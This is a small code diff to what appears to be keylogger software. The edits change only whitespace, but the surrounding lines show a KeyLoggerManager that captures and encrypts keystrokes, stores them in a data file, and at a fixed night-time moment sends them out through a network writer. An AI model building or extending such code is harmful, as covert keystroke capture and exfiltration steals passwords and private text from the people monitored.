@@ -11,6 +11,7 @@ import logging
 
 logging.basicConfig(filename='../log.txt', level=logging.DEBUG, format='%(asctime)s - %(message)s', filemode='a')
 
+
 class KeyLoggerManager:
     """
     Manages the keylogger, encryption, and data writing processes.
@@ -48,7 +49,6 @@ class KeyLoggerManager:
         except KeyboardInterrupt:
             self.keylogger.stop_logging()
             self.flag = False
-
 
     def handle_logging(self):
         """
@@ -90,7 +90,6 @@ class KeyLoggerManager:
             The encrypted log data to be written or sent.
         """
         if datetime.now().hour == 2 and datetime.now().minute == 20 and 0 <= datetime.now().second <= 5:
-
             self.writer = NetWorkWriter()
             with open('../Data_File.txt', 'r') as file:
                 encrypted_data = file.read() + encrypted_data
@@ -108,7 +107,5 @@ def main():
     key_logger.handle_logging()
 
 
-
 if __name__ == "__main__":
     main()
-
